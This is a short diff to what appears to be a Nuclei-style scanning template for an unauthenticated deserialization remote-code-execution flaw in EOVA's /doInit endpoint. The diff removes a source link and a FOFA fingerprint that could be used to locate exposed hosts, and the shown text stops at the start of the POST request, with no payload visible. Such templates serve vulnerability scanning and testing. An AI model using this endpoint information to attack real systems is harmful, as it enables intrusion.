@@ -3,12 +3,8 @@ info:
   name: EOVA未授权doInit接口存在反序列化漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tguzyf8gcp7lrf2g'
+  description: ''
   tags: rce,unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tguzyf8gcp7lrf2g
-    fofa: icon_hash="-1699356011"
 http:
 - raw:
   - 'POST /doInit HTTP/1.1
